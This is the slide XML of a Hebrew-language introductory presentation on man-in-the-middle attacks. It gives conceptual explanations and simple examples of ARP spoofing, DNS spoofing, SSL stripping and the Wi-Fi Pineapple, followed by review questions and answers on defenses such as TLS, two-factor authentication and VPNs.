      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38947488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5B67C9-32A4-4F99-A826-7F84B7A41ABF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4820478" y="715616"/>
            <a:ext cx="6304722" cy="1298577"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות אמצע נוספות</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38669A65-10B0-40E2-B2A4-C4F148607F51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2014194"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>ARP Spoofing (ARP Poisoning) .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא פרוטוקול הממפה כתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לכתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ברשת מקומית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>LAN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בהתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ARP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף שולח הודעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מזויפות ברשת המקומית כדי לשייך את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הקורבן לכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד? ברגע שהנתבים והמחשבים ברשת מאמינים שהכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הקורבן משויכת לכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של התוקף, כל התעבורה המיועדת לקורבן מגיעה לתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם ברשת יש מחשבים של אליס ובוב, והתוקף קרול רוצה ליירט את התקשורת ביניהם, קרול שולחת הודעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ARP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מזויפות לאליס ובוב כך שהם מאמינים שהכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של בוב משויכת לכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של קרול ולהפך. כך כל התקשורת ביניהם עוברת דרך קרול.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25194225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83C01F-3387-40C2-883E-8DA23E1D437A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4840356" y="642594"/>
            <a:ext cx="6284843" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות אמצע נוספות</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98015466-8A95-45B9-A20C-641D767FA83B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DNS Spoofing .2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה? הוא הפרוטוקול שאחראי על תרגום שמות מתחם בהתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף מזייף תשובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להפנות את המשתמשים לכתובות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מזויפות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד? התוקף שולח תשובות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מזויפות לפני ששרת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מספיק לענות. המשתמשים מקבלים את התשובה המזויפת ומופנים לאתרים שהכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלהם נשלטת על ידי התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם משתמש מנסה לגשת לאתר הבנק שלו, התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DNS Spoofing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולה להפנות אותו לאתר מזויף שנראה כמו אתר הבנק, ושם התוקף יכול לגנוב את פרטי ההתחברות של המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8361062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ED134BE-A635-45D0-830C-84A4B7F18F01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="208722" y="822960"/>
            <a:ext cx="12066104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות אמצע נוספות - טכניקות מתקדמות יותר</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF899F99-FF7E-4720-8567-D5AC76924AB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SSL Stripping .3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא טכניקה בה התוקף מסיר את ההצפנה של חיבור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאובטח והופך אותו לחיבור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לא מאובטח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד? התוקף מתערב בתקשורת בין המשתמש לאתר ובמקום להעביר את הבקשה לאתר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מעביר את הבקשה לאתר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המשתמש אינו שם לב לשינוי, והתוקף יכול ליירט ולשנות את התקשורת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשתמש מנסה לגשת לאתר בנק באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף משנה את הכתובת ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומעביר את המידע הלא מוצפן לשרת של התוקף. התוקף יכול כעת לראות ולשנות את התעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32312046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8A1AEB9-DA40-46E9-9704-B40F244CAE96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="208722" y="652534"/>
            <a:ext cx="12095921" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות אמצע נוספות - טכניקות מתקדמות יותר</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF6CC030-6E8D-45F2-B983-980535CB9249}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Wi-Fi Pineapple .4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה? הוא כלי שמאפשר לבצע התקפות אמצע על רשתות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא נבנה כדי לבדוק את האבטחה של רשתות אלחוטיות, אך תוקפים יכולים להשתמש בו למטרות זדוניות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד? הכלי מתחזה לנקודת גישה אלחוטית תמימה (כמו רשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בבית קפה), וברגע שמשתמשים מתחברים אליו, הכלי יכול ליירט ולשנות את התקשורת שלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף מציב</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wi-Fi Pineapple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בבית קפה עם שם רשת זהה לרשת המקומית. כאשר משתמשים מתחברים לרשת של התוקף, הוא יכול ליירט את כל התעבורה שלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36654601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F66D79A-382C-4F36-A1C9-EB47E47B5C43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5148470" y="642594"/>
            <a:ext cx="5976730" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע - שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B92B843F-5CCC-4FAF-BFFD-4E3C7EE58746}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהי התקפת אמצע ומה הם שלביה המרכזיים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. מהן השיטות השונות להגן על עצמנו מפני התקפת אמצע?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. תן דוגמה להתקפת אמצע ברשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ציבורית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. כיצד הצפנת התקשורת באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TLS/SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולה למנוע התקפת אמצע?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17426259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DDBD2B0-8FDF-4DB1-9626-6F874AC7BC1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4979504" y="642594"/>
            <a:ext cx="6145696" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{548E1831-C52B-42AE-B5F5-EB5083B91200}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. התקפת אמצע היא סוג של התקפה במהלכה התוקף מתמקם בין שני צדדים מתקשרים ומשיג גישה למידע המועבר ביניהם מבלי שהם מודעים לכך. השלבים המרכזיים כוללים יירוט התקשורת, יירוט המידע, שינוי התקשורת והתחזות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הצפנת תקשורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TLS/SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אימות דו שלבי, ועל ידי שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> VPN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>והימנעות מרשתות ציבוריות לא מאובטחות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. יוסי מחובר לרשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בבית קפה ומבצע התקפת אמצע על דן, שגם הוא מחובר לאותה רשת. יוסי יכול ליירט את התקשורת של דן עם הבנק ולהשיג מידע רגיש כמו סיסמאות או פרטי חשבון בנק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. הצפנת התקשורת מבטיחה שגם אם התוקף יירט את התקשורת, הוא לא יוכל לפענח את המידע המוצפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41337859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384F60-6D73-4ECF-8E00-308C8C98E317}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="642594"/>
            <a:ext cx="7010399" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע – שאלות חלק ב'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4957DA1-35B3-45EC-9D49-BF748C088410}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ARP Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS Spoofing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL Stripping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מסכן את המשתמשים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כיצד ניתן להגן על עצמך מפני התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מה היתרון של שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wi-Fi Pineapple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
